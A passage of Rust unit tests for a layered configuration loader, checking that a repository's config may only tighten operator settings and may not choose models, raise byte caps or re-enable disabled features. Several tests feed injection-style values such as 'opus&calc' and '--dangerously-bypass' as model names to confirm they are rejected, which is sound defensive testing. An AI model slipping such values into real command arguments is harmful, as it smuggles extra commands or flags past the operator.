                home: "[pace]\nmax_percent = 70.0\n",
                repo: "[pace]\nmax_percent = 99.9\n",
                want_enabled: true,
                want_max: 70.0,
                want_soft: 80.0,
            },
            // A repo LOWERING the ceiling below the operator's own value
            // must succeed -- this is the legitimate "this repo is
            // expensive, be more careful here" case the fold exists for.
            Case {
                home: "[pace]\nmax_percent = 99.0\n",
                repo: "[pace]\nmax_percent = 60.0\n",
                want_enabled: true,
                want_max: 60.0,
                want_soft: 80.0,
            },
            // Same for soft_percent, and a repo turning pacing back ON
            // against an operator who explicitly disabled it -- narrowing
            // is allowed to push stricter than home too, the same "repo may
            // ratchet stricter than the operator configured" rule
            // `policy::resolve` already uses.
            Case {
                home: "[pace]\nenabled = false\nsoft_percent = 90.0\n",
                repo: "[pace]\nenabled = true\nsoft_percent = 50.0\n",
                want_enabled: true,
                want_max: 99.0,
                want_soft: 50.0,
            },
            // No repo layer at all: home's own values, untouched.
            Case {
                home: "[pace]\nmax_percent = 55.0\n",
                repo: "",
                want_enabled: true,
                want_max: 55.0,
                want_soft: 80.0,
            },
        ] {
            let home_dir = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
            if !case.home.is_empty() {
                std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
                std::fs::write(home_dir.path().join(".zirv/ctx.toml"), case.home).expect("write");
            }
            let repo = tempfile::tempdir().expect("tempdir");
            if !case.repo.is_empty() {
                std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
                std::fs::write(repo.path().join(".zirv/ctx.toml"), case.repo).expect("write");
            }
            let empty = env_map(&[]);
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect("a repo narrowing pace.* must not be a load error");
            assert_eq!(
                cfg.pace.enabled, case.want_enabled,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
            assert_eq!(
                cfg.pace.max_percent, case.want_max,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
            assert_eq!(
                cfg.pace.soft_percent, case.want_soft,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
        }
    }

    /// Issue #309: the fold rule itself, pure and direct -- the same
    /// no-config-file, no-`CtxConfig::load` shape as
    /// `the_pace_narrowing_fold_rule_favours_the_stricter_layer_either_direction`.
    #[test]
    fn the_verify_on_stop_narrowing_fold_rule_favours_the_stricter_layer_either_direction() {
        // enabled: false (stricter, the feature is off) wins no matter which
        // layer set it.
        assert!(narrow_verify_on_stop_enabled(true, None));
        assert!(
            !narrow_verify_on_stop_enabled(false, Some(true)),
            "repo may not re-enable an operator-disabled feature"
        );
        assert!(
            !narrow_verify_on_stop_enabled(true, Some(false)),
            "repo may disable it"
        );
        assert!(narrow_verify_on_stop_enabled(true, Some(true)));

        // max_nudges: lower (stricter) wins no matter which layer set it.
        assert_eq!(narrow_max_nudges(2, None), 2);
        assert_eq!(
            narrow_max_nudges(2, Some(10)),
            2,
            "repo may not raise the cap above home's own"
        );
        assert_eq!(
            narrow_max_nudges(5, Some(1)),
            1,
            "repo may lower it below home's own"
        );
    }

    /// Issue #309: the full `CtxConfig::load` integration -- a repo-layer
    /// `verify_on_stop.enabled = true` must not resurrect a feature the
    /// operator's own `~/.zirv/ctx.toml` turned off, and a repo layer may
    /// still tighten `max_nudges` below the operator's own cap.
    #[test]
    fn a_repo_layer_may_only_narrow_verify_on_stop_enabled_and_max_nudges() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[verify_on_stop]\nenabled = false\nmax_nudges = 5\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[verify_on_stop]\nenabled = true\nmax_nudges = 1\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.verify_on_stop.enabled,
            "a repo may not re-enable an operator-disabled verify_on_stop"
        );
        assert_eq!(
            cfg.verify_on_stop.max_nudges, 1,
            "a repo may still tighten the nudge cap"
        );
    }

    /// Issue #155, Phase 3: the fold rule itself, mirroring `the_pace_
    /// narrowing_fold_rule_favours_the_stricter_layer_either_direction` with
    /// the opposite polarity -- `false` is strict here, not `true`.
    #[test]
    fn the_dedupe_narrowing_fold_rule_favours_always_injecting() {
        assert!(!narrow_dedupe_bool(false, None));
        assert!(
            !narrow_dedupe_bool(false, Some(true)),
            "repo may not re-enable a skip the operator disabled"
        );
        assert!(
            !narrow_dedupe_bool(true, Some(false)),
            "repo may disable a skip the operator left on"
        );
        assert!(narrow_dedupe_bool(true, None), "both loose: stays loose");
        assert!(narrow_dedupe_bool(true, Some(true)));
    }

    /// `context.dedupe_native` is deliberately NOT `REPO_FORBIDDEN`, unlike
    /// the byte caps beside it: a repo layer can only ever set it `false`,
    /// which causes MORE context to be injected -- narrowing, the direction
    /// this trust model allows. A repo layer's `true` must not be able to
    /// SUPPRESS an operator's own `false`.
    #[test]
    fn a_repo_layer_may_disable_native_dedupe_but_never_re_enable_it() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[context]\ndedupe_native = false\n",
        )
        .expect("write home layer");

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[context]\ndedupe_native = true\n",
        )
        .expect("write repo layer");

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(
            !cfg.context.dedupe_native,
            "the operator's own false must survive a repo layer's true"
        );
    }

    /// The default, and the common case: neither layer mentions the key at
    /// all, so it must stay at the built-in `true` -- not fold to `false`
    /// the way an unmodified `narrow_pace_bool` reuse would (its `repo`-
    /// absent case contributes `false`, the wrong polarity for this key).
    #[test]
    fn dedupe_native_defaults_to_true_when_neither_layer_sets_it() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(cfg.context.dedupe_native);
    }

    /// T9: the operator's own env override is still the final word over
    /// both layers, exactly like every other config key -- narrowing is a
    /// repo-vs-home question only, and env sits above the fold entirely.
    #[test]
    fn env_still_overrides_the_pace_narrowing_fold_outright() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nenabled = false\nmax_percent = 10.0\n",
        )
        .expect("write");
        let env = env_map(&[
            ("ZIRV_CTX_PACE", "true"),
            ("ZIRV_CTX_PACE_MAX_PERCENT", "95.0"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.pace.enabled);
        assert_eq!(cfg.pace.max_percent, 95.0);
    }

    #[test]
    fn env_overrides_use_credits_and_poll() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE_USE_CREDITS_CLAUDE", "true"),
            ("ZIRV_CTX_PACE_POLL", "false"),
            ("ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS", "120"),
            ("ZIRV_CTX_PACE_SOFT_PERCENT", "70"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.pace.use_credits.claude);
        assert!(!cfg.pace.use_credits.codex);
        assert!(!cfg.pace.poll_enabled);
        assert_eq!(cfg.pace.poll_min_interval_secs, 120);
        assert_eq!(cfg.pace.soft_percent, 70.0);
    }

    #[test]
    fn review_config_defaults_to_unset_for_both_agents() {
        let review = ReviewConfig::default();
        assert_eq!(review.claude, None);
        assert_eq!(review.codex, None);
    }

    #[test]
    fn the_operator_may_set_review_models_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[review]\nclaude = \"opus\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.review.codex, None);

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CODEX", "gpt-5.6-terra")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.review.claude.as_deref(),
            Some("opus"),
            "the home layer still applies under the env layer"
        );
        assert_eq!(cfg.review.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    /// Same trust boundary as `pace.use_credits`/`handoff.model`: a repo
    /// checkout must not be able to pick which model spends the operator's
    /// vendor account running review.
    #[test]
    fn a_repo_layer_may_not_touch_review_model_keys() {
        for toml in [
            "[review]\nclaude = \"opus\"\n",
            "[review]\ncodex = \"gpt-5.6-terra\"\n",
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains("review"), "names the offending key: {err}");
            assert!(
                err.contains("ZIRV_CTX_REVIEW_MODEL_CLAUDE"),
                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps both review keys unset.
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude, None);
        assert_eq!(cfg.review.codex, None);
    }

    /// FIX 1's charset guard applies identically to `review.claude`/
    /// `review.codex`: both reach the same argv surface `chat.model` does
    /// once a review round launches that adapter's own child.
    #[test]
    fn review_model_charset_is_validated_like_chat_model() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CLAUDE", "opus&calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a metacharacter review model must fail the load");
        assert!(err.to_string().contains("review.claude"), "got {err}");

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CODEX", "--dangerously-bypass")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash review model must fail the load");
        assert!(err.to_string().contains("review.codex"), "got {err}");

        let env = env_map(&[
            ("ZIRV_CTX_REVIEW_MODEL_CLAUDE", "opus"),
            ("ZIRV_CTX_REVIEW_MODEL_CODEX", "gpt-5.6-terra"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.review.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    #[test]
    fn worker_config_defaults_to_unset_for_both_agents() {
        let worker = WorkerConfig::default();
        assert_eq!(worker.claude, None);
        assert_eq!(worker.codex, None);
    }

    #[test]
    fn the_operator_may_set_worker_models_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[worker]\nclaude = \"opus\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.worker.codex, None);

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CODEX", "gpt-5.6-terra")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.worker.claude.as_deref(),
            Some("opus"),
            "the home layer still applies under the env layer"
        );
        assert_eq!(cfg.worker.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    /// Same trust boundary as `review.claude`/`review.codex`: a repo checkout
    /// must not be able to pick which model spends the operator's vendor
    /// account running a delegated headless worker.
    #[test]
    fn a_repo_layer_may_not_touch_worker_model_keys() {
        for toml in [
            "[worker]\nclaude = \"opus\"\n",
            "[worker]\ncodex = \"gpt-5.6-terra\"\n",
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains("worker"), "names the offending key: {err}");
            assert!(
                err.contains("ZIRV_CTX_WORKER_MODEL_CLAUDE"),
                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps both worker keys unset.
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude, None);
        assert_eq!(cfg.worker.codex, None);
    }

    /// FIX 1's charset guard applies identically to `worker.claude`/
    /// `worker.codex`: both reach a delegation spawn's own launch argv
    /// directly (`adapters::worker_model_args`).
    #[test]
    fn worker_model_charset_is_validated_like_chat_model() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CLAUDE", "opus&calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a metacharacter worker model must fail the load");
        assert!(err.to_string().contains("worker.claude"), "got {err}");

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CODEX", "--dangerously-bypass")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash worker model must fail the load");
        assert!(err.to_string().contains("worker.codex"), "got {err}");

        let env = env_map(&[
            ("ZIRV_CTX_WORKER_MODEL_CLAUDE", "opus"),
            ("ZIRV_CTX_WORKER_MODEL_CODEX", "gpt-5.6-terra"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.worker.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    #[test]
    fn optimize_defaults_are_conservative() {
        let optimize = OptimizeConfig::default();
        assert!(optimize.enabled, "the hook recommendation is on by default");
        assert_eq!(optimize.sessions_sampled, 10);
        assert_eq!(optimize.max_surface_bytes, 200_000);
        assert_eq!(
            optimize.model, "",
            "empty means reuse the handoff model rather than inventing a second default"
        );
        assert_eq!(optimize.recommend_tool_failure_rate, 0.25);
        assert_eq!(optimize.recommend_corrections, 3);
        assert_eq!(optimize.recommend_cooldown_secs, 86_400);
    }

    #[test]
    fn optimize_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nsessions_sampled = 3\nrecommend_corrections = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 3);
        assert_eq!(cfg.optimize.recommend_corrections, 9);

        let env = env_map(&[("ZIRV_CTX_OPTIMIZE_SESSIONS", "7")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 7);
    }

    #[test]
    fn prompt_defaults_inject_with_a_capped_repo_layer() {
        let prompt = PromptConfig::default();
        assert!(prompt.enabled);
        assert!(prompt.repo_layer);
        assert_eq!(prompt.max_repo_bytes, 4096);
        assert!(prompt.harnesses);
        assert!(prompt.codex_orchestrator);
    }

    #[test]
    fn a_repo_may_not_enable_its_own_prompt_layer_or_raise_its_cap() {
        // The same trust boundary as agent_bin: a checkout must not be able to
        // decide that text from the checkout gets injected, nor how much of it.
        // A repo that could raise max_repo_bytes would make the cap decorative.
        // `harnesses` is here for the same reason: a repo must not be able to
        // force the derived roster back on for an operator who turned it off.
        // `codex_orchestrator` (issue #167): same asymmetry, for codex's own
        // orchestrator-conventions layer.
        for (key, value) in [
            ("enabled", "true"),
            ("repo_layer", "true"),
            ("max_repo_bytes", "1000000"),
            ("harnesses", "false"),
            ("codex_orchestrator", "false"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[prompt]\n{key} = {value}\n"),
            )
            .expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("prompt.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_PROMPT"),
                "the error names where the operator may set it: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_raise_the_repo_cap() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_MAX_REPO_BYTES", "9000")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.prompt.max_repo_bytes, 9000);
    }

    #[test]
    fn the_operator_may_still_set_prompt_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.enabled,
            "the environment is the operator, not the checkout"
        );
    }

    #[test]
    fn the_operator_may_still_toggle_the_harness_roster() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_HARNESSES", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.harnesses,
            "the environment is the operator, not the checkout"
        );
    }

    /// Issue #167: the codex orchestrator layer's own operator switch.
    #[test]
    fn the_operator_may_still_toggle_the_codex_orchestrator_layer() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_CODEX_ORCHESTRATOR", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.codex_orchestrator,
            "the environment is the operator, not the checkout"
        );
    }

    #[test]
    fn context_defaults_match_prompt_max_repo_bytes() {
        let context = ContextConfig::default();
        assert_eq!(context.max_common_bytes, 4096);
        assert_eq!(context.max_harness_bytes, 4096);
        assert_eq!(context.max_harness_roster_bytes, 4096);
    }

    #[test]
    fn a_repo_may_not_raise_its_own_context_budget() {
        // Same trust boundary as prompt.max_repo_bytes: a repo checkout must
        // not be able to raise the cap on its own untrusted content.
        for (key, value) in [
            ("max_common_bytes", "1000000"),
            ("max_harness_bytes", "1000000"),
            ("max_harness_roster_bytes", "1000000"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[context]\n{key} = {value}\n"),
            )
            .expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("context.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_CONTEXT"),
                "the error names where the operator may set it: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_raise_the_context_budget() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_CONTEXT_MAX_COMMON_BYTES", "9000"),
            ("ZIRV_CTX_CONTEXT_MAX_HARNESS_BYTES", "8000"),
            ("ZIRV_CTX_CONTEXT_MAX_HARNESS_ROSTER_BYTES", "7000"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.context.max_common_bytes, 9000);
        assert_eq!(cfg.context.max_harness_bytes, 8000);
        assert_eq!(cfg.context.max_harness_roster_bytes, 7000);
    }

    /// The follow-up PR #67 assigned to issue #44: once `cfg.policy` is
    /// load-bearing (the context compiler attaches it to every session), the
    /// shared config-load-failure fallback must not hand back the widest
    /// possible policy.
    #[test]
    fn degrade_to_operator_only_fails_closed_on_policy_not_open() {
        let empty = env_map(&[]);
        let degraded = degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert_eq!(
            degraded.policy,
            super::super::policy::EffectivePolicy::fail_closed(),
            "a failed config load must not silently become the widest (default/Allow) policy"
        );
        assert_ne!(
            degraded.policy,
            super::super::policy::EffectivePolicy::default(),
            "fail_closed must differ from the permissive default, or this test proves nothing"
        );
    }

    #[test]
    fn a_repo_may_not_choose_the_optimize_model() {
        // Same trust boundary as handoff.model: a checkout must not name the
        // model zirv spends tokens on.
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nmodel = \"opus\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("repo may not set optimize.model");
        let msg = err.to_string();
        assert!(msg.contains("optimize.model"), "got {msg}");
        assert!(
            msg.contains("ZIRV_CTX_OPTIMIZE_MODEL"),
            "name the alternative: {msg}"
        );
    }

    #[test]
    fn mail_defaults_are_enabled_with_sane_caps() {
        let mail = MailConfig::default();
        assert!(mail.enabled, "the mailbox is on by default");
        assert_eq!(mail.max_message_bytes, 4096);
        assert_eq!(mail.max_delivered_bytes, 4096);
        assert_eq!(mail.keep, 50);
    }

    #[test]
    fn mail_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[mail]\nkeep = 10\nmax_message_bytes = 2048\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.mail.keep, 10);
        assert_eq!(cfg.mail.max_message_bytes, 2048);
        assert_eq!(
            cfg.mail.max_delivered_bytes, 4096,
            "untouched keys keep defaults"
        );

        let env = env_map(&[
            ("ZIRV_CTX_MAIL", "false"),
            ("ZIRV_CTX_MAIL_MAX_MESSAGE_BYTES", "512"),
            ("ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES", "256"),
            ("ZIRV_CTX_MAIL_KEEP", "5"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.mail.enabled);
        assert_eq!(cfg.mail.max_message_bytes, 512);
        assert_eq!(cfg.mail.max_delivered_bytes, 256);
        assert_eq!(cfg.mail.keep, 5);
    }

    /// `.settings.toml` and `ctx.toml` are deliberately distinct files:
    /// `agents` is `#[serde(skip)]` on `CtxConfig`, so an `[agents]` table
    /// inside `ctx.toml` is unrecognized rather than silently accepted.
    #[test]
    fn agents_in_ctx_toml_is_rejected_so_the_two_files_stay_distinct() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("[agents] belongs in .settings.toml, not ctx.toml");
        assert!(err.to_string().contains("agents"), "got {err}");
    }

    #[test]
    fn chrome_defaults_are_all_on() {
        let chrome = ChromeConfig::default();
        assert!(chrome.banner, "the launch banner is on by default");
        assert!(chrome.bar, "the status bar is on by default");
        assert!(chrome.events, "the announcement channel is on by default");
    }

    #[test]
    fn chrome_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbanner = false\nbar = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
        assert!(cfg.chrome.events, "untouched keys keep defaults");

        let env = env_map(&[
            ("ZIRV_CTX_CHROME_BANNER", "false"),
            ("ZIRV_CTX_CHROME_BAR", "false"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
    }

    /// `ZIRV_CTX_QUIET=true` must turn the announcement channel off, not on:
    /// it is the negation of `chrome.events`, the one entry in `ENV_MAP`
    /// whose meaning is inverted from the key it feeds.
    #[test]
    fn zirv_ctx_quiet_inverts_into_chrome_events() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "true")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.chrome.events,
            "quiet=true must silence the announcement channel"
        );

        let env = env_map(&[("ZIRV_CTX_QUIET", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            cfg.chrome.events,
            "quiet=false must leave the announcement channel on"
        );
    }

    #[test]
    fn a_non_boolean_quiet_value_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "loud")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_QUIET"), "got {err}");
    }

    /// `chrome.bar`/`chrome.banner` are not in `REPO_FORBIDDEN`: unlike
    /// `agent_bin` or `handoff.model`, neither names what zirv runs or
    /// spends tokens on, so a repository may configure its own defaults for
    /// them. `chrome.events` is different -- see
    /// `a_repo_may_not_silence_the_announcement_channel` below.
    #[test]
    fn a_repository_may_configure_chrome() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbar = false\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.bar);
    }

    /// S1: mail is folded into the composed prompt as its own layer
    /// (`with_mail_layer`), the same reasoning that puts `prompt.max_repo_
    /// bytes` in `REPO_FORBIDDEN` -- a repo raising its own delivered-mail
    /// cap would make the cap decorative, and a repo re-enabling delivery
    /// after an operator disabled it would defeat the point of disabling it.
    #[test]
    fn a_repo_may_not_raise_the_mail_delivered_cap_or_toggle_delivery() {
        for (key, value) in [("max_delivered_bytes", "1000000"), ("enabled", "true")] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[mail]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
